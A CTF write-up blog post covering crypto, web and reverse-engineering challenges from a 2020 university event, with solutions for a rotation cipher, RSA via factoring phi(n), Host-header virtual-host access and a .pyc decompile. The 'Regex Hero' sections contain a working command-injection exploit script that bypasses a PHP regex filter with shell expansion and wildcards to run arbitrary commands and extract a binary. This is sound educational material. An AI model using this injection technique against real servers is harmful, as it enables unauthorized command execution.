---
title: NUS Computing Day 2020 CTF by NUS Greyhats
date: 2020-09-06 14:23:00 +0800
categories: [ctf]
tags: [rsa, php]
---

# Crypto

## Spin the letter around (50 pts)

```
Can you find the mystery message?
yetz{pxevhfxmhvhfinmbgzwtr}
```

To solve this challenge, we just need to apply the rotational cipher of 7 shifts on it. The tool I used was [CyberChef](https://gchq.github.io/CyberChef/), a must-have tool for every CTF.

![](/assets/images/nus1.png)

<br>

## Private RSA (475 pts)

```
Textbook RSA says that phi(n) and d are the private keys, and with them you can decrypt any ciphertext. So this challenge should be easy: Decrypt the ciphertext given the private keys!
Note the flag format is cs2107{...}
File: mystery.txt
```

In the `mystery.txt` are the values `c`, `d` and `phi(n)`.

```
c = 253620658836956397879167057613987183398001365628074436177131657084056795451578610497629849400530657880521989448942531106938642777213645083688552872994753396162506269349876328450845036839886102837982624217073435264653919432839716828321857385223798323722216586478801098184694254363488903877720323862677455883741311750
d = 165540640635518549873800998358099696804236863014785868270788694179165569621621626061950244644817868021233062714558832767113645369345596564667019043490263582433385031460028134745731829625528535165110873093503628561978647399801661248354311866552204934383399230107542223204379558671255597502277394021457005467909564679
phi(n) = 425059648494758500827957593186813469635953846662167111751375929039086827709540334419226240424071129923122503452017813337634158390001885415158185566409664627684690322852923348122784319620248608048182882437956187655008823198198465452715004069652755525145676075641602530382487060636219769963885647035371462184882402544
```

To decrypt `c`, we will need to recover the original `n` value. If you factorise `phi(n)`, you will get a list of prime numbers. (I used this [website](https://www.alpertron.com.ar/ECM.HTM)) and used `Python` to extract each individual factor.

```python

>>> list_of_factors
[2, 2, 2, 2, 336700853343689, 2168618486876659, 2372920016563403, 2403046799405089, 2586814523352023, 3622576076504453, 4243869938141279, 4563116379369167, 5554076710006157, 5754080039950003, 6215349115364177, 6280486020663289, 7113969462989429, 7363116243840713, 7982189543923849, 8909447726951003, 9101401300427207, 9251874130484561, 9392042922946403, 9566645979971233]
```

Since we know that `phi(n)` is equals to `(p - 1) * (q - 1)`, we will need to divide this list of factors into 2 groups where the product of the first group will form `(p - 1)` while the product of the second group will form `(q - 1)`. There are actually many different combinations we need to try but there are actually 2 facts that can help us drill down:

```
1) The decrypted flag contains "cs2107{".
2) Since "p" and "q" are large prime numbers, they will most likely be odd. Therefore, "(p - 1)" and "(q - 1)" are most likely to be even.
```

With these facts, I constructed the below script to decrypt `c`.

```python
from Crypto.Util.number import long_to_bytes
from itertools import combinations 
from sys import exit

c = 253620658836956397879167057613987183398001365628074436177131657084056795451578610497629849400530657880521989448942531106938642777213645083688552872994753396162506269349876328450845036839886102837982624217073435264653919432839716828321857385223798323722216586478801098184694254363488903877720323862677455883741311750
d = 165540640635518549873800998358099696804236863014785868270788694179165569621621626061950244644817868021233062714558832767113645369345596564667019043490263582433385031460028134745731829625528535165110873093503628561978647399801661248354311866552204934383399230107542223204379558671255597502277394021457005467909564679
totient_n = 425059648494758500827957593186813469635953846662167111751375929039086827709540334419226240424071129923122503452017813337634158390001885415158185566409664627684690322852923348122784319620248608048182882437956187655008823198198465452715004069652755525145676075641602530382487060636219769963885647035371462184882402544

list_of_factors = [2, 2, 2, 2, 336700853343689, 2168618486876659, 2372920016563403, 2403046799405089, 2586814523352023, 3622576076504453, 4243869938141279, 4563116379369167, 5554076710006157, 5754080039950003, 6215349115364177, 6280486020663289, 7113969462989429, 7363116243840713, 7982189543923849, 8909447726951003, 9101401300427207, 9251874130484561, 9392042922946403, 9566645979971233]

even_factors = list_of_factors[:4]
odd_factors = list_of_factors[4:]
print "=" * 50

for i in range(1, len(odd_factors)/2 + 1):                                                                           
	for left_bag in combinations(odd_factors, i):
		left_bag = left_bag
		right_bag = odd_factors[:]
		for element in left_bag:
			right_bag.remove(element)
		p = 1
		q = 1
		for element in left_bag:
			p *= element
		for element in right_bag:
			q *= element
		for x in range(1, len(even_factors)):
			new_p = p * 2 ** x
			new_q = q * 2 ** (len(even_factors) - x) 
			new_p += 1
			new_q += 1
			assert totient_n == (new_p - 1) * (new_q - 1)
			print "Testing p: {}".format(new_p)
			print "Testing q: {}".format(new_q)
			n = new_p * new_q
			m = pow(c,d,n)
			output = long_to_bytes(m)
			if "cs2107{" in output:
				print "Found flag: {}".format(output)
				exit(0)
			print "=" * 50
```

The output that I got was:

```
Found flag: cs2107{rOSeS_aRe_reD__Bad_RSA__tHeRe_Is_No_WaR_iN_bA_sInG_sE}
```

<hr>

# Web

## Internal Network (241 pts)

```
We found out that winc0rp has an internal website hosted on this ip address. However, is it really internal?
I heard the internal website is located at internal.proxy.winc0rp.com
Please find the internal website hosted on http://computing.jackielyc.me:8080/
```

If you visit the link given, you will see that the flag is not here. If you try accessing `http://internal.proxy.winc0rp.com:8080/`, you will get an `404` or `Page Not Found`.

![](/assets/images/nus2.png)

In order to access the internal website, we simply need to alter the `Host` header in our web request. 

```bash
$ curl -H "Host: internal.proxy.winc0rp.com" http://computing.jackielyc.me:8080/
Flag is:
flag{B@sic_P3ntesting_Sk111s_R3quir3d!}
```

This is actually an example of "Name-based virtual hosting", where web servers are configured to serve different websites depending on the `Host` header of the request. This allows for multiple websites to run on a single web server. But if there is no `DNS` record for the internal hostname, then you will have to manually specify the internal hostname in the `Host` header.

<br>

## Regex Hero 1 (442 pts)

```
The flag seems to be somewhere...
But I cant find it.
Can you help me?
http://www.websec.pw:9090/
```

When we visit the link, we are immediately presented with the source code of the `index.php`.

```php
 <?php
    error_reporting(E_ERROR | E_PARSE);
    $file = $_GET['f'];
    if (!$file) highlight_file(__FILE__);

    if (preg_match('#[^cat -/:-@\[-`\{-~]#', $file)) {
        die("cat only");
    }

    if (strpos($file,'*') !== false) {
        die("you don't need that actually");
    }

    if (isset($file)) {
        system("cat " . $file);
    }
?>
```

According to the code, we can probably inject something into the `system()` call via the `f` parameter. However, we will need to circumvent the `preg_match()` regex check.

Here are some facts that I made use of:

```
1. The shell used to execute commands in the `system()` function is `/bin/sh`.
2. `${#}` is equals to `0` and `${##}` is equals to `1`.
3. `$((${##}+${##}))` is equals to 2 and we can repeat `${##}` to create the other digits.
4. We cannot enter characters other than "c", "a" or "t" but we can use `cat` to read the content of other files on the system and save it into a variable by doing act=`cat ?????.???`. In this case, the files that I used were `/etc/motd` and `index.php`.
5. In order to read `/etc/motd` and `index.php`, I used `?` since it is a wildcard for a single character that can replace the characters that I cannot enter. I used `/?tc/??t?` to reference `/etc/motd` and `?????.???` to reference `index.php`, which is located in the current working directory.
6. To retrieve a single character in a string variable, I made use of the `${parameter%word}` and `${parameter#word}` notations, which allows me to pop characters from the front and back of a string. I also used the `?` character since I cannot specify the exact letters to pop.
```

With these facts, I made the following exploit script to automate these. 

```python
{% raw %}
import requests
import sys

motd = requests.get("http://www.websec.pw:9090/index.php?f=;cat /?tc/??t?").content
index = requests.get("http://www.websec.pw:9090/index.php?f=;cat ?????.???").content
initial = "http://www.websec.pw:9090/index.php?f=;act=`cat ?????.???`;c=`cat /?tc/??t?`;"
cache = {}

def main():
	command = sys.argv[1]
	body = ""
	execution = ""
	counter = 0
	for letter in command:
		if letter.isdigit():
			counter += 1
			num = int(letter)
			if num == 0:
				body += "{}=\"${{%23}}\";".format(counter*"c")
			else:
				body += "{}=\"$(({}))\";".format(counter*"c", "%2b".join(["${%23%23}"]*num))
			execution += "$" + counter * "c"
			continue
        # A little ugly but you will understand it in `Regex Hero 2`.
		if letter == "P":
			idx1 = index.find(letter)	
			idx2 = len(index) - idx1 - 2
			body += "{}=\"${{{}%23{}}}\";".format("actt", "act", idx1 * "?")
			body += "{}=\"${{{}%25{}}}\";".format("acttt", "actt", idx2 * "?")
			execution += "$acttt"
			continue
		idx1 = motd.find(letter)
		if idx1 == -1:
			print("cannot find {}".format(letter))
			return
		idx2 = len(motd) - idx1 - 2
		if letter not in cache:
			counter += 1
			body += "{}=\"${{{}%23{}}}\";".format(counter*"t", "c", idx1 * "?")
			body += "{}=\"${{{}%25{}}}\";".format(counter*"a", counter * "t", idx2 * "?")
			execution += "$" + counter * "a"
			cache[letter] = "$" + counter * "a"
		else:
			execution += cache[letter]

	# Run
	print "Command Output: {}".format(requests.get(initial + body + execution).content)

if __name__ == "__main__":
	main()
{% endraw %}
```

Now lets test it out.

```bash
$ python exploit.py id
Command Output: 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `flag.txt` is at the root directory, but we do not have permissions to read it. We will need to execute `readflag` which is also in the root directory.

```bash
$ python exploit.py /readflag
Command Output: 
FLAG{7h15_15_7HE_Fl49}
```

<br>

## Regex Hero 2 (494 pts)

```
The flag seems to be somewhere deeper...
But I cant find it either.
Can you help me?
http://www.websec.pw:9091/
```

The source code of the `index.php` was exactly the same, so all I had to do was change all the URLs to the new one. However, `readflag` is now protected with a password.

```bash
$ python exploit.py /readflag
Command Output: 
Wrong Password!
```

Lets run `strings` to see if we can find the password.

```bash
$ python exploit.py "strings /readflag"
Command Output:
...
P4S5W0RD
Password requried!
Wrong Password!
/flag.txt
...
```

It seems the password might be `P4S5W0RD`? At this point I couldn't use the character "P" because initially I was only using `/etc/motd` to get characters, which happens to not include that letter. Hence, I had to modify my payload to store the contents of `index.php` into a variable and add a special check  for the character "P".

```bash
$ python exploit.py "/readflag P4S5W0RD"
Command Output: 
Wrong Password!
```

Oh shoot it's not. Hmm we might need to download this binary and analyse it. To do so, we can use the `base64` command.

```bash
$ python exploit.py "base64 /readflag"
Command Output:
...
(Too long so I left it out)
...
```

And on our machine, we can decode it again and save it to a file.

```bash
$ base64 -d strings_output > readflag
```

Using `gdb`, we can set a breakpoint before the `strcmp()` call and view the stack to get the password

```
$ gdb -q --args ./readflag P4S5W0RD
(gdb) disassemble main
...
   0x000000000000122b <+166>:   callq  0x1070 <strcmp@plt>
...
(gdb) b *(main+166)
Breakpoint 1 at 0x122b
(gdb) r
Starting program: /home/kali/Desktop/readflag PASSWORD

Breakpoint 1, 0x000055555555522b in main ()
(gdb) x/20s $rsp
...
0x7fffffffddf7: "SDP450WR"
```

It seems that the correct password is `SDP450WR`! 

```bash
$ python exploit.py "/readflag SDP450WR"
Command Output: 
FLAG{7HI5_I5_4N07h3r_Fl49}
```

<hr>

# Sanity

## Sanity (50 pts)

```
This challenge is to test that you know how to use the submission platform.
The Flag is flag{computing_2020}
```

Just a sanity check, moving on!

<hr>

# Reverse

## Trivial Python (50 pts)

```
It's trivial, my dear Watson.
File: trivial.pyc
```

The file provided contains the compiled bytecode of Python source files. Hence, all we have to do is decompile it. There are a few ways to do it, but if you are lazy like me, then you can simply use an online [website](https://www.toolnb.com/tools-lang-en/pyc.html) to do it for you. There is also a library called [`uncompyle6`](https://pypi.org/project/uncompyle6/) which does the same thing.

Here is the source code that we recovered:

```python
# uncompyle6 version 3.5.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.5 (default, Aug  7 2019, 00:51:29) 
# [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
# Embedded file name: ./trivial.py
# Compiled at: 2020-08-25 23:47:45
import json, sys

def check(flag):
    processed = flag[::-1]
    processed = processed.decode('base64')
    final = json.loads(processed)
    if final['check_code'] != 'WW0209':
        return False
    if final['flag_content']['numbers'] * 2 != 202002091:
        return False
    if final['flag_content']['change'] != 'standardisation'[::2]:
        return False
    if final['flag_content']['settled'] != {% raw %}'flag{%s_%d_%s}'{% endraw %}:
        return False
    temp = final['flag_content']
    return temp['settled'] % (temp['change'], temp['numbers'], final['check_code'])


def main():
    if len(sys.argv) != 2:
        print 'No'
        sys.exit()
    result = check(sys.argv[1])
    if result:
        print result
    else:
        print 'No'


if __name__ == '__main__':
    main()
```

I won't go down to every detail in this code, but the main focus was that the flag consisted of 3 parts: `numbers`, `change` and `check_code`. We will need to figure out the original values for all 3 of these in order to get the flag. 

Firstly, `numbers`.

```python
    if final['flag_content']['numbers'] * 2 != 202002091:
        return False
```

When `numbers` is multipied by `2`, it needs to be equal to `202002091`. Hence, to get the original value, we just need to divide `202002091` by `2` but make sure to remember to include the decimal place. In this case, we can do this to get `numbers`.

```python
>>> 202002091 / 2.0
101001045.5
```

Next, `change`.

```python
    if final['flag_content']['change'] != 'standardisation'[::2]:
        return False
```

`change` needs to be equals to `'standardisation'[::2]`. The `[::2]` is a form of `Python`'s slice notation and this [link](https://stackoverflow.com/questions/509211/understanding-slice-notation) will provide a better explanation for you. Essentially what it does is return a string containing every other character in `'standardisation'`.

```python
>>> 'standardisation'[::2]
'sadriain'
```

Finally, `check_code`.

```python
    if final['check_code'] != 'WW0209':
        return False
```

This is rather straightforward since it is literally just checking if `check_code` is equals to the string `WW0209`.

Now if we put them all together, we will get our flag:

```python
>>> >>> "flag{% raw %}{%s_%d_%s}{% endraw %}" % ('sadriain', 101001045.5, 'WW0209') 
'flag{sadriain_101001045_WW0209}'
```

